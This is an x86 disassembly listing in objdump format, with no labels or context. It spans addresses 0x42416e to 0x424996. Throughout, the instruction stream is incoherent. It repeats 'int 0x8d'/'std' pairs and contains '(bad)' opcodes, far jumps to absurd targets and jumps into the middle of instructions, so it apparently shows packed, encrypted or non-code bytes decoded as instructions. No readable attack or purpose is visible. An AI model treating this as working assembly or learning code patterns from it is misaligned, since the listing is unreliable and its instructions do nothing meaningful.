  42416e:	stos   BYTE PTR es:[edi],al
  42416f:	cmp    esp,ecx
  424171:	shl    ebp,cl
  424173:	sub    BYTE PTR [ebx+0xc],dl
  424176:	or     cl,BYTE PTR [ebp-0x2723243]
  42417c:	int    0x8d
  42417e:	std    
  42417f:	int    0x8d
  424181:	std    
  424182:	int    0x8d
  424184:	std    
  424185:	int    0x8d
  424187:	std    
  424188:	int    0x8d
  42418a:	std    
  42418b:	int    0x8d
  42418d:	std    
  42418e:	int    0x8d
  424190:	std    
  424191:	int    0x8d
  424193:	std    
  424194:	int    0x8d
  424196:	std    
  424197:	leave  
  424198:	jbe    0x4241ab
  42419a:	fadd   st,st(5)
  42419c:	loope  0x4241f3
  42419e:	int    0x8d
  4241a0:	std    
  4241a1:	int    0xa6
  4241a3:	std    
  4241a4:	cmp    esp,ecx
  4241a6:	cmp    ecx,DWORD PTR [edi]
  4241a8:	shl    ebp,cl
  4241aa:	sub    bl,dl
  4241ac:	jmp    0x424140
  4241ae:	push   ebx
  4241af:	or     al,0xcd
  4241b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241b2:	dec    esp
  4241b3:	int    0x9f
  4241b5:	sub    eax,0x43808081
  4241ba:	push   ebx
  4241bb:	das    
  4241bc:	add    eax,0x80808717
  4241c1:	int    0x8d
  4241c3:	std    
  4241c4:	int    0xa6
  4241c6:	std    
  4241c7:	cmp    ecx,DWORD PTR [edi]
  4241c9:	cmp    esp,ecx
  4241cb:	shr    ebx,cl
  4241cd:	xchg   edx,eax
  4241ce:	shl    ebp,cl
  4241d0:	sub    BYTE PTR [ebx+0xc],dl
  4241d3:	inc    ebx
  4241d4:	adc    ebp,DWORD PTR [edi]
  4241d6:	add    eax,0x8080877f
  4241db:	int    0xca
  4241dd:	add    DWORD PTR [eax-0x69327f80],eax
  4241e3:	std    
  4241e4:	int    0xa6
  4241e6:	std    
  4241e7:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  4241ed:	xchg   edx,eax
  4241ee:	shl    ebp,cl
  4241f0:	sub    BYTE PTR [ebx-0x2b],dl
  4241f3:	inc    ebx
  4241f4:	adc    ebp,DWORD PTR [edi]
  4241f6:	add    eax,0x8080875b
  4241fb:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  424201:	int    0xf1
  424203:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  424209:	shl    ebx,cl
  42420b:	xchg   edx,eax
  42420c:	shl    ebp,cl
  42420e:	sub    BYTE PTR [ebx-0x2b],dl
  424211:	or     dl,BYTE PTR [esi+0x1196cd11]
  424217:	inc    ebx
  424218:	icebp  
  424219:	aam    0x26
  42421b:	int    0x76
  42421d:	std    
  42421e:	int    0x96
  424220:	std    
  424221:	cmp    ebx,ecx
  424223:	cmp    edi,DWORD PTR [ecx-0x2d]
  424226:	jmp    0xd253:0x92bdd328
  42422d:	int    0x96
  42422f:	adc    DWORD PTR [ebx-0x26],esi
  424232:	adc    al,0x5e
  424234:	test   BYTE PTR [edx-0x2a],cl
  424237:	xor    cl,ch
  424239:	jbe    0x424238
  42423b:	int    0x96
  42423d:	std    
  42423e:	cmp    ebx,ecx
  424240:	cmp    edi,DWORD PTR [ecx-0x2d]
  424243:	jmp    0xd253:0x92bdd328
  42424a:	int    0x96
  42424c:	adc    DWORD PTR [ebx-0x26],esi
  42424f:	adc    al,0x5e
  424251:	je     0x42429d
  424253:	xor    BYTE PTR [edi],ch
  424255:	add    eax,0x808092df
  42425a:	int    0x76
  42425c:	std    
  42425d:	int    0x76
  42425f:	std    
  424260:	int    0xa6
  424262:	std    
  424263:	int    0x76
  424265:	std    
  424266:	cmp    ecx,ecx
  424268:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  42426e:	in     al,dx
  42426f:	xchg   edx,eax
  424270:	push   ebx
  424271:	popf   
  424272:	int    0x76
  424274:	adc    DWORD PTR [ebx+0x6d],esi
  424277:	adc    al,0x87
  424279:	ror    ebp,cl
  42427b:	jl     0x4242ad
  42427d:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  424283:	int    0x8d
  424285:	std    
  424286:	int    0x96
  424288:	std    
  424289:	cmp    ecx,DWORD PTR [edi]
  42428b:	cmp    ebx,ecx
  42428d:	shr    ebx,cl
  42428f:	xchg   edx,eax
  424290:	shr    edx,cl
  424292:	sub    BYTE PTR [ebx+0x13],dl
  424295:	int    0x96
  424297:	std    
  424298:	or     cl,BYTE PTR [ebp+0xa88cd95]
  42429e:	lea    esi,[ebp+0x3bfd8dcd]
  4242a4:	cdq    
  4242a5:	cmp    esi,eax
  4242a7:	shl    edx,cl
  4242a9:	sub    bl,dl
  4242ab:	repz xchg edx,eax
  4242ad:	push   ebx
  4242ae:	jecxz  0x42427d
  4242b0:	lea    esi,[ebp-0x792becbd]
  4242b6:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  4242bc:	int    0x8d
  4242be:	std    
  4242bf:	int    0x96
  4242c1:	std    
  4242c2:	cmp    ecx,DWORD PTR [edi]
  4242c4:	cmp    ebx,ecx
  4242c6:	shr    ebx,cl
  4242c8:	xchg   edx,eax
  4242c9:	shr    edx,cl
  4242cb:	sub    BYTE PTR [ebx+0x13],dl
  4242ce:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  4242d2:	jbe    0x424271
  4242d4:	popa   
  4242d5:	and    DWORD PTR [esi-0x777278cb],eax
  4242db:	or     cl,BYTE PTR [ebp-0x32781313]
  4242e1:	(bad)  
  4242e2:	in     eax,dx
  4242e3:	int    0x76
  4242e5:	dec    esp
  4242e6:	int    0x1
  4242e8:	adc    DWORD PTR [ecx+0x718080],eax
  4242ee:	xor    ch,cl
  4242f0:	jbe    0x42433e
  4242f2:	add    dh,dl
  4242f4:	in     eax,dx
  4242f5:	int    0x1
  4242f7:	adc    DWORD PTR [ecx+0x70008080],eax
  4242fd:	dec    esp
  4242fe:	leave  
  4242ff:	jbe    0x4242a6
  424301:	pop    DWORD PTR [ebp*1-0x5a89368a]
  424308:	dec    edx
  424309:	pop    ss
  42430a:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  424310:	xchg   esi,eax
  424311:	std    
  424312:	cmp    ecx,DWORD PTR [edi]
  424314:	cmp    ebx,ecx
  424316:	shr    ebx,cl
  424318:	xchg   edx,eax
  424319:	shr    edx,cl
  42431b:	sub    BYTE PTR [ebx+0x13],dl
  42431e:	or     dh,BYTE PTR [esi-0x4b]
  424321:	inc    ebx
  424322:	jge    0x4242fa
  424324:	pop    eax
  424325:	int    0x76
  424327:	stc    
  424328:	int    0x8d
  42432a:	stc    
  42432b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42432e:	lock shl edx,cl
  424331:	sub    bl,dl
  424333:	mov    ebp,0xcdd35392
  424338:	lea    esp,[ebp+0x3ba596cd]
  42433e:	fnstcw WORD PTR [ebx]
  424340:	psrlq  mm5,mm2
  424343:	sub    BYTE PTR [edi+0x4c76cd9d],al
  424349:	int    0x1
  42434b:	adc    DWORD PTR [ecx-0x142c7f80],eax
  424351:	xchg   edx,eax
  424352:	push   ebx
  424353:	jecxz  0x424384
  424355:	rcl    ebp,1
  424357:	bound  eax,QWORD PTR [eax]
  424359:	jo     0x42438f
  42435b:	int    0x76
  42435d:	std    
  42435e:	int    0x8d
  424360:	std    
  424361:	cmp    edi,DWORD PTR [ecx+0x3b]
  424364:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42436b:	push   ebx
  42436c:	rol    DWORD PTR [ebx+0x76],cl
  42436f:	mov    ch,0xd6
  424371:	and    ch,cl
  424373:	jbe    0x424312
  424375:	int    0x8d
  424377:	popf   
  424378:	cmp    esi,eax
  42437a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42437d:	mov    ebp,0x28f2d392
  424382:	push   ebx
  424383:	jge    0x4243c8
  424385:	fld    TBYTE PTR [edi]
  424387:	pop    es
  424388:	xchg   esp,eax
  424389:	add    BYTE PTR [eax],al
  42438b:	add    ch,cl
  42438d:	jbe    0x42438c
  42438f:	int    0x8d
  424391:	std    
  424392:	cmp    edi,DWORD PTR [ecx+0x3b]
  424395:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42439c:	push   ebx
  42439d:	rol    DWORD PTR [ebx+0x76],cl
  4243a0:	mov    ch,0xd6
  4243a2:	and    ch,cl
  4243a4:	jbe    0x42439f
  4243a6:	int    0x8d
  4243a8:	stc    
  4243a9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243ac:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243b3:	push   ebx
  4243b4:	rol    DWORD PTR [ecx-0x5f14428a],cl
  4243ba:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  4243c4:	leave  
  4243c5:	jbe    0x4243bc
  4243c7:	fdivr  st,st(4)
  4243c9:	sbb    al,0xb
  4243cb:	int    0xa6
  4243cd:	std    
  4243ce:	int    0x76
  4243d0:	std    
  4243d1:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4243d7:	xchg   edx,eax
  4243d8:	shr    DWORD PTR [ebp-0x1462acd8],cl
  4243de:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  4243e4:	std    
  4243e5:	int    0x8d
  4243e7:	std    
  4243e8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243eb:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243f2:	push   ebx
  4243f3:	ror    DWORD PTR [edx],cl
  4243f5:	jbe    0x4243e4
  4243f7:	int    0x76
  4243f9:	std    
  4243fa:	int    0x8d
  4243fc:	std    
  4243fd:	cmp    edi,DWORD PTR [ecx+0x3b]
  424400:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424407:	push   ebx
  424408:	ror    DWORD PTR [edx],cl
  42440a:	jbe    0x424401
  42440c:	int    0x8d
  42440e:	std    
  42440f:	int    0x76
  424411:	std    
  424412:	cmp    ecx,DWORD PTR [edi]
  424414:	cmp    ecx,ecx
  424416:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  42441c:	push   ebx
  42441d:	jge    0x4243ec
  42441f:	jbe    0x4243b6
  424421:	inc    ebx
  424422:	jge    0x4243f8
  424424:	xchg   ch,cl
  424426:	test   BYTE PTR ds:0xcded760a,bl
  42442c:	jbe    0x4243db
  42442e:	int    0x84
  424430:	sbb    eax,0xcdf5760a
  424435:	jbe    0x424434
  424437:	int    0x8d
  424439:	std    
  42443a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42443d:	lock shl edx,cl
  424440:	sub    bl,dl
  424442:	mov    ebp,0xcdd35392
  424447:	(bad)  
  424448:	in     eax,dx
  424449:	inc    ebx
  42444a:	rcl    esp,cl
  42444c:	push   esp
  42444d:	int    0x76
  42444f:	std    
  424450:	int    0x8d
  424452:	std    
  424453:	cmp    esi,eax
  424455:	cmp    edi,DWORD PTR [ecx-0x2d]
  424458:	repnz sub bl,dl
  42445b:	mov    ebp,0xcdd35392
  424460:	(bad)  
  424461:	in     eax,dx
  424462:	shr    ebx,cl
  424464:	sub    al,BYTE PTR [ebx-0x2d]
  424467:	aam    0x1c
  424469:	int    0x8d
  42446b:	in     eax,dx
  42446c:	int    0x76
  42446e:	dec    esp
  42446f:	int    0x1
  424471:	adc    DWORD PTR [ecx-0x44d07f80],eax
  424477:	retf   
  424478:	jno    0x42447a
  42447a:	(bad)  
  42447b:	mov    ch,0x0
  42447d:	jo     0x424407
  42447f:	in     al,dx
  424480:	push   ds
  424481:	int    0x76
  424483:	cmc    
  424484:	xchg   DWORD PTR [esi-0x78],esi
  424487:	int    0x8d
  424489:	dec    esp
  42448a:	int    0xa
  42448c:	adc    DWORD PTR [ecx+0x6d048080],eax
  424492:	xchg   edx,eax
  424493:	jo     0x424495
  424495:	(bad)  
  424496:	mov    ch,0x0
  424498:	jno    0x424422
  42449a:	or     dh,BYTE PTR [esi-0xb]
  42449d:	int    0x76
  42449f:	std    
  4244a0:	int    0x8d
  4244a2:	std    
  4244a3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244a6:	lock shl edx,cl
  4244a9:	sub    bl,dl
  4244ab:	mov    ebp,0xcdd35392
  4244b0:	(bad)  
  4244b1:	cmc    
  4244b2:	inc    ebx
  4244b3:	ror    ebp,cl
  4244b5:	jbe    0x4244b0
  4244b7:	int    0x8d
  4244b9:	stc    
  4244ba:	(bad)  
  4244bb:	xor    DWORD PTR [ebx],edi
  4244bd:	jns    0x4244fa
  4244bf:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244c6:	push   ebx
  4244c7:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  4244cd:	cmp    esi,eax
  4244cf:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244d2:	repnz sub bl,dl
  4244d5:	mov    ebp,0xcdd35392
  4244da:	(bad)  
  4244db:	cmc    
  4244dc:	das    
  4244dd:	rcl    ebx,1
  4244df:	int    0x8d
  4244e1:	lods   eax,DWORD PTR ds:[esi]
  4244e2:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  4244e9:	(bad)  
  4244ea:	stc    
  4244eb:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244ee:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244f5:	push   ebx
  4244f6:	rol    DWORD PTR [edi-0x2893263],cl
  4244fc:	int    0x8d
  4244fe:	std    
  4244ff:	cmp    esi,eax
  424501:	cmp    edi,DWORD PTR [ecx-0x2d]
  424504:	repnz sub bl,dl
  424507:	mov    ebp,0xcdd35392
  42450c:	lea    ebp,[ebp+0x2f1f845e]
  424512:	push   es
  424513:	or     al,0xff
  424515:	add    BYTE PTR [eax],al
  424517:	int    0x76
  424519:	adc    ebp,ecx
  42451b:	lea    edx,[ecx]
  42451d:	ins    BYTE PTR es:[edi],dx
  42451e:	sar    DWORD PTR [ebp-0x30b330d8],cl
  424524:	test   BYTE PTR [eax-0x2cac7f80],al
  42452a:	int    0x8d
  42452c:	icebp  
  42452d:	push   esi
  42452e:	dec    ecx
  42452f:	and    DWORD PTR [esi-0x2ec14cb],eax
  424535:	add    BYTE PTR [eax],al
  424537:	int    0x76
  424539:	std    
  42453a:	int    0x8d
  42453c:	std    
  42453d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424540:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424547:	push   ebx
  424548:	rcr    DWORD PTR [esi+0x76],cl
  42454b:	mov    ebp,0x76cd88d6
  424550:	stc    
  424551:	int    0x8d
  424553:	stc    
  424554:	in     al,dx
  424555:	xchg   ch,cl
  424557:	jbe    0x424556
  424559:	int    0x8d
  42455b:	std    
  42455c:	cmp    esi,eax
  42455e:	cmp    edi,DWORD PTR [ecx-0x56]
  424561:	shl    edx,cl
  424563:	sub    bl,dl
  424565:	mov    ebp,0xd353a892
  42456a:	arpl   bx,cx
  42456c:	ror    BYTE PTR [eax-0x12326980],cl
  424572:	add    al,0xed
  424574:	xor    al,0xc9
  424576:	jbe    0x424575
  424578:	dec    ecx
  424579:	and    DWORD PTR [esi-0x528936cb],eax
  42457f:	inc    ecx
  424580:	and    DWORD PTR [esi+0x4c76cd35],eax
  424586:	or     dh,BYTE PTR [esi+0x4c]
  424589:	cwde   
  42458a:	int    0x6d
  42458c:	int    0x76
  42458e:	std    
  42458f:	int    0x96
  424591:	std    
  424592:	sar    bh,0x5f
  424595:	shl    DWORD PTR [ecx],1
  424597:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  42459d:	cdq    
  42459e:	shr    edx,cl
  4245a0:	sub    bl,dl
  4245a2:	mov    ebp,0xcdd25392
  4245a7:	xchg   esi,eax
  4245a8:	mov    BYTE PTR [ebx-0xf],al
  4245ab:	das    
  4245ac:	add    eax,0x80808159
  4245b1:	int    0x76
  4245b3:	mov    ch,cl
  4245b5:	xchg   esi,eax
  4245b6:	mov    BYTE PTR [edi+0xa9a6470],al
  4245bc:	xchg   esi,eax
  4245bd:	cmc    
  4245be:	leave  
  4245bf:	jbe    0x4245ba
  4245c1:	popa   
  4245c2:	and    DWORD PTR [esi-0x68932cb],eax
  4245c8:	int    0x96
  4245ca:	stc    
  4245cb:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  4245d1:	rcl    ebx,cl
  4245d3:	mov    ebp,0xcdd25392
  4245d8:	xchg   esi,eax
  4245d9:	std    
  4245da:	int    0xe6
  4245dc:	std    
  4245dd:	cmp    esp,ebx
  4245df:	cmp    edi,edi
  4245e1:	shr    ecx,cl
  4245e3:	sub    bl,dl
  4245e5:	repz xchg edx,eax
  4245e7:	push   ebx
  4245e8:	fxch   st(5)
  4245ea:	out    0xf5,al
  4245ec:	pop    esi
  4245ed:	xchg   esp,eax
  4245ee:	leave  
  4245ef:	fsubr  QWORD PTR [edi]
  4245f1:	add    eax,0x8080816b
  4245f6:	int    0x96
  4245f8:	cmc    
  4245f9:	int    0x76
  4245fb:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  424601:	or     ch,0x96
  424604:	mov    ch,cl
  424606:	out    0xf5,al
  424608:	xor    ebx,DWORD PTR [edx-0x21932ac]
  42460e:	pop    ebx
  42460f:	int    0xa6
  424611:	std    
  424612:	cmp    edi,edx
  424614:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  42461a:	in     eax,0x28
  42461c:	push   ebx
  42461d:	cld    
  42461e:	or     dl,BYTE PTR [esi+0x2fd943a5]
  424624:	add    eax,0x8080814f
  424629:	int    0x96
  42462b:	std    
  42462c:	int    0xe6
  42462e:	std    
  42462f:	cmp    esp,ebx
  424631:	cmp    edi,edi
  424633:	shl    ebx,cl
  424635:	xchg   edx,eax
  424636:	shr    ecx,cl
  424638:	sub    BYTE PTR [ebx-0x27],dl
  42463b:	or     dl,BYTE PTR [esi+0x4c76c911]
  424641:	mov    dl,0x21
  424643:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  424649:	out    0xfd,al
  42464b:	cmp    esp,ebx
  42464d:	cmp    edi,edi
  42464f:	shl    ebx,cl
  424651:	xchg   edx,eax
  424652:	shr    ecx,cl
  424654:	sub    BYTE PTR [ebx-0x27],dl
  424657:	jmp    0x42465b
  424659:	add    BYTE PTR [eax-0x2693280],0xcd
  424660:	(bad)  
  424661:	std    
  424662:	add    al,0xf7
  424664:	(bad)  
  424665:	cmp    esp,ebx
  424667:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  42466d:	push   ebx
  42466e:	cdq    
  42466f:	iret   
  424670:	ja     0x42466b
  424672:	jecxz  0x424663
  424674:	inc    ebx
  424675:	cdq    
  424676:	das    
  424677:	add    al,0x21
  424679:	add    BYTE PTR [eax-0x3004cc80],0xe4
  424680:	jo     0x42460a
  424682:	or     dl,dh
  424684:	mov    ch,0x2f
  424686:	mov    ebx,0xea121a
  42468b:	das    
  42468c:	add    BYTE PTR [eax-0x321269f6],0x96
  424693:	in     eax,dx
  424694:	xchg   DWORD PTR [eax],esi
  424696:	int    0xd6
  424698:	in     eax,dx
  424699:	xchg   DWORD PTR [eax-0x2d],edx
  42469c:	repz sub bl,dl
  42469f:	mov    ecx,0x2ffb5392
  4246a4:	mov    ebx,0x4cf3d31a
  4246a9:	adc    dh,bh
  4246ab:	dec    ecx
  4246ac:	and    DWORD PTR [esi-0x1229f5cb],eax
  4246b2:	or     dl,BYTE PTR [esi-0x12693243]
  4246b8:	int    0xd6
  4246ba:	in     eax,dx
  4246bb:	cmp    esp,ebx
  4246bd:	add    al,0xf7
  4246bf:	call   ebx
  4246c1:	repz xchg edx,eax
  4246c3:	sar    DWORD PTR [ecx-0x7866acd8],cl
  4246c9:	xchg   esi,eax
  4246ca:	mov    BYTE PTR [edx],cl
  4246cc:	xchg   esi,eax
  4246cd:	in     eax,dx
  4246ce:	int    0x96
  4246d0:	dec    esp
  4246d1:	int    0xd6
  4246d3:	dec    esp
  4246d4:	cmp    esp,ebx
  4246d6:	add    al,0xf7
  4246d8:	call   ebx
  4246da:	mov    ecx,0x92f3d328
  4246df:	push   ebx
  4246e0:	cdq    
  4246e1:	int    0xd6
  4246e3:	mov    ebp,0x32d6fb43
  4246e8:	int    0x96
  4246ea:	dec    esp
  4246eb:	int    0xd6
  4246ed:	dec    esp
  4246ee:	cmp    esp,ebx
  4246f0:	add    al,0xf7
  4246f2:	call   ebx
  4246f4:	mov    ecx,0x92f3d328
  4246f9:	push   ebx
  4246fa:	cdq    
  4246fb:	int    0xd6
  4246fd:	mov    ebp,0x88d6fb43
  424702:	int    0x96
  424704:	in     eax,dx
  424705:	int    0xd6
  424707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424708:	add    DWORD PTR [edx+0x4],0x8d0092c9
  42470f:	mov    ch,0x2f
  424711:	push   es
  424712:	xchg   ebx,eax
  424713:	add    BYTE PTR [eax],al
  424715:	add    BYTE PTR [ecx-0x6932ee5a],al
  42471b:	stc    
  42471c:	int    0xd6
  42471e:	stc    
  42471f:	cmp    esp,ebx
  424721:	add    al,0xf7
  424723:	call   ebx
  424725:	mov    ecx,0x92f3d328
  42472a:	push   ebx
  42472b:	cdq    
  42472c:	int    0xd6
  42472e:	adc    ebp,ecx
  424730:	out    0xf5,al
  424732:	inc    ebx
  424733:	aam    0xd9
  424735:	in     al,0x77
  424737:	sub    al,0xcd
  424739:	xchg   esi,eax
  42473a:	std    
  42473b:	int    0xd6
  42473d:	std    
  42473e:	cmp    esp,ebx
  424740:	add    al,0xf7
  424742:	call   ebx
  424744:	repz xchg edx,eax
  424746:	sar    DWORD PTR [ecx+0x53c58728],cl
  42474c:	cdq    
  42474d:	int    0x9c
  42474f:	test   BYTE PTR [ebx-0x1e],al
  424752:	das    
  424753:	push   es
  424754:	test   BYTE PTR [eax],al
  424756:	add    BYTE PTR [eax],al
  424758:	arpl   bp,cx
  42475a:	jbe    0x424709
  42475c:	cmp    edx,ebx
  42475e:	int    0x8d
  424760:	lods   eax,DWORD PTR ds:[esi]
  424761:	add    al,0x2
  424763:	jmp    FWORD PTR [edx+0x76cd4aec]
  424769:	std    
  42476a:	cmp    edx,ebx
  42476c:	int    0x8d
  42476e:	std    
  42476f:	cmp    ecx,DWORD PTR [edi]
  424771:	shl    edx,cl
  424773:	sub    bl,dl
  424775:	mov    ebp,0xa8d35392
  42477a:	retf   
  42477b:	ror    BYTE PTR [eax-0x12326980],cl
  424781:	adc    ch,ch
  424783:	xchg   ebp,eax
  424784:	add    BYTE PTR [eax-0x2893680],0x49
  42478b:	and    DWORD PTR [esi-0x68936cb],eax
  424791:	inc    ecx
  424792:	and    DWORD PTR [esi-0x28932cb],eax
  424798:	int    0x8d
  42479a:	std    
  42479b:	cwde   
  42479c:	call   0x8621:0xd169ffc0
  4247a3:	xor    eax,0xbdd3793b
  4247a8:	xchg   edx,eax
  4247a9:	mov    al,ds:0xf2d3133b
  4247ae:	sub    BYTE PTR [ebx-0x2d],dl
  4247b1:	or     dh,BYTE PTR [esi-0x53]
  4247b4:	int    0x76
  4247b6:	std    
  4247b7:	int    0x8d
  4247b9:	std    
  4247ba:	cmp    edi,DWORD PTR [ecx-0x2d]
  4247bd:	mov    ebp,0xd3133b92
  4247c2:	repnz sub BYTE PTR [ebx-0x2d],dl
  4247c6:	or     dh,BYTE PTR [esi-0xf]
  4247c9:	int    0xe6
  4247cb:	and    al,0xcd
  4247cd:	jbe    0x4247bc
  4247cf:	int    0x8d
  4247d1:	in     eax,dx
  4247d2:	cmp    edx,ebx
  4247d4:	or     dh,BYTE PTR [esi-0x13]
  4247d7:	adc    dh,BYTE PTR [esi-0x13]
  4247da:	dec    ecx
  4247db:	mov    al,ds:0x76cd3586
  4247e0:	cmc    
  4247e1:	int    0x8d
  4247e3:	cmc    
  4247e4:	cmp    edx,ebx
  4247e6:	or     dh,BYTE PTR [esi-0xb]
  4247e9:	adc    dh,BYTE PTR [esi-0xb]
  4247ec:	dec    ecx
  4247ed:	lahf   
  4247ee:	xchg   BYTE PTR ds:0xcd1176cd,dh
  4247f4:	lea    edx,[ecx]
  4247f6:	cmp    edx,ebx
  4247f8:	or     dh,BYTE PTR [esi+0x11]
  4247fb:	adc    dh,BYTE PTR [esi+0x11]
  4247fe:	imul   esp,DWORD PTR [ecx],0x76cd3586
  424804:	mov    ch,0xcd
  424806:	lea    esi,[ebp+0x760ad33b]
  42480c:	mov    ch,0x12
  42480e:	jbe    0x4247c5
  424810:	dec    ecx
  424811:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  424818:	hlt    
  424819:	mov    esi,DWORD PTR ds:0x68876cd
  42481f:	ins    DWORD PTR es:[edi],dx
  424820:	das    
  424821:	add    eax,0x80808551
  424826:	int    0x76
  424828:	dec    esp
  424829:	push   es
  42482a:	ins    DWORD PTR es:[edi],dx
  42482b:	das    
  42482c:	add    eax,0x80808538
  424831:	int    0x76
  424833:	sbb    al,0x6
  424835:	ins    DWORD PTR es:[edi],dx
  424836:	das    
  424837:	add    eax,0x80808523
  42483c:	int    0x76
  42483e:	and    al,0xcd
  424840:	jbe    0x424866
  424842:	int    0x8d
  424844:	mov    bl,dl
  424846:	mov    ebp,0x39af5692
  42484b:	add    BYTE PTR [eax+0x2f815eb8],0x6
  424852:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  42485c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42485f:	mov    ebp,0xd3133b92
  424864:	repnz sub BYTE PTR [ebx-0x2d],dl
  424868:	or     dh,BYTE PTR [esi-0xf]
  42486b:	int    0x76
  42486d:	std    
  42486e:	int    0x76
  424870:	std    
  424871:	int    0x76
  424873:	mov    ch,cl
  424875:	lea    ecx,[eax-0x329b8379]
  42487b:	outs   dx,BYTE PTR ds:[esi]
  42487c:	jo     0x424888
  42487e:	lea    esp,[esi+eax*1]
  424881:	ins    DWORD PTR es:[edi],dx
  424882:	das    
  424883:	add    eax,0x808084f0
  424888:	leave  
  424889:	jbe    0x424820
  42488b:	dec    ecx
  42488c:	and    DWORD PTR [eax+0x35],edi
  42488f:	int    0x76
  424891:	xchg   ebp,eax
  424892:	pop    ebx
  424893:	int    0xa6
  424895:	xchg   ebp,eax
  424896:	cmp    edi,DWORD PTR [ecx+0x3b]
  424899:	loop   0x42486e
  42489b:	mov    ebp,0x28e5d392
  4248a0:	push   ebx
  4248a1:	popf   
  4248a2:	or     ah,BYTE PTR [esi-0x289326b]
  4248a8:	int    0x76
  4248aa:	std    
  4248ab:	int    0x8
  4248ad:	sub    eax,0xcd808081
  4248b2:	xor    ch,cl
  4248b4:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  4248b8:	int    0x76
  4248ba:	std    
  4248bb:	int    0x76
  4248bd:	std    
  4248be:	int    0x8
  4248c0:	and    eax,0xcd808081
  4248c5:	sbb    al,0xa
  4248c7:	xchg   esi,eax
  4248c8:	dec    esp
  4248c9:	inc    ebx
  4248ca:	fst    st(6)
  4248cc:	push   0xffffffcd
  4248ce:	(bad)  
  4248cf:	cmc    
  4248d0:	int    0x8
  4248d2:	adc    DWORD PTR [ecx-0x69307f80],eax
  4248d8:	lods   eax,DWORD PTR ds:[esi]
  4248d9:	(bad)  
  4248da:	int    0x96
  4248dc:	cmc    
  4248dd:	cmp    ecx,DWORD PTR [edi]
  4248df:	add    al,0xfb
  4248e1:	call   ebx
  4248e3:	jmp    0x424877
  4248e5:	shr    edx,cl
  4248e7:	sub    BYTE PTR [ebx-0x1d],dl
  4248ea:	int    0x8d
  4248ec:	dec    esp
  4248ed:	bound  eax,QWORD PTR [eax]
  4248ef:	xchg   ecx,eax
  4248f0:	jo     0x42494d
  4248f2:	add    BYTE PTR [eax+0x24],dh
  4248f5:	int    0x8d
  4248f7:	dec    esp
  4248f8:	int    0x6e
  4248fa:	xchg   esp,eax
  4248fb:	int    0x7e
  4248fd:	jo     0x424932
  4248ff:	jge    0x424972
  424901:	xchg   ebp,eax
  424903:	jo     0x4248c2
  424905:	dec    esi
  424906:	xchg   BYTE PTR [eax+0x248dcd80],al
  42490c:	int    0x8
  42490e:	xor    eax,0xa808081
  424913:	sbb    al,0x0
  424915:	xchg   ecx,eax
  424916:	xchg   esp,eax
  424917:	add    dh,dl
  424919:	mov    BYTE PTR [ebx-0x43],bl
  42491c:	or     eax,0xcd808084
  424921:	pop    ebx
  424922:	fs xchg ebp,edx
  424925:	das    
  424926:	mov    ebx,0x74cf1452
  42492b:	xor    BYTE PTR [edx+ecx*1],bl
  42492e:	jbe    0x42494c
  424930:	int    0x76
  424932:	std    
  424933:	int    0x8d
  424935:	std    
  424936:	cmp    edi,DWORD PTR [ecx+0x4]
  424939:	add    bh,bh
  42493b:	shl    edx,cl
  42493d:	sub    bl,dl
  42493f:	mov    ebp,0x2fd35392
  424944:	mov    ebx,0x960a868a
  424949:	and    al,0x43
  42494b:	jge    0x42497c
  42494d:	add    eax,0x808080e9
  424952:	int    0x76
  424954:	std    
  424955:	int    0x8d
  424957:	std    
  424958:	cmp    edi,DWORD PTR [ecx+0x4]
  42495b:	add    bh,bh
  42495d:	shl    edx,cl
  42495f:	sub    bl,dl
  424961:	mov    ebp,0xad35392
  424966:	jbe    0x42490d
  424968:	int    0x76
  42496a:	stc    
  42496b:	int    0x8d
  42496d:	stc    
  42496e:	add    al,0x2
  424970:	(bad)  
  424971:	cmp    edi,DWORD PTR [ecx-0x2d]
  424974:	repnz sub bl,dl
  424977:	mov    ebp,0x2fd35392
  42497c:	mov    ebx,0x7d33868a
  424981:	pop    esi
  424982:	lea    esp,[ebp-0x7f2ef7d1]
  424988:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  42498f:	mov    BYTE PTR [edx],cl
  424991:	lea    ebx,[esp+ebp*8]
  424994:	xchg   ebp,ecx
  424996:	lea    ebx,[ecx*8+0x31cd5c52]
